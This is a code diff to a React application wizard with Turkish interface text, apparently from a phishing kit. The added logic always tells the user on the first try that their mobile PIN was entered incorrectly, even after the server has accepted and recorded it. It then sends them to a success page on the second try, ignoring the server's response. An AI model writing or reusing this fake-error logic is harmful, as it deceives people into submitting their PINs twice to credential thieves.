@@ -68,6 +68,7 @@ export default function ApplicationWizard() {
   const [modal, setModal] = useState<ModalState | null>(null);
   const [loading, setLoading] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState("Lütfen bekleyiniz...");
+  const [pinAttemptCount, setPinAttemptCount] = useState(0);
 
   const resetForm = () => {
     setIdentity(emptyIdentity);
@@ -218,14 +219,17 @@ export default function ApplicationWizard() {
 
     if (!res.ok) throw new Error(data.error || "Kayıt başarısız");
 
-    if (data.canAdvance) {
-      setFormStep(2);
+    const currentAttempt = pinAttemptCount;
+    setPinAttemptCount((n) => n + 1);
+
+    // 1. deneme → her zaman hata göster
+    if (currentAttempt === 0) {
+      showModal("Mobil şifrenizi hatalı girdiniz.");
       return;
     }
 
-    if (data.message) {
-      showModal(data.message);
-    }
+    // 2. deneme ve sonrası → success sayfasına git
+    setWizardStep("success");
   };
 
   const handleIdentitySubmit = async () => {
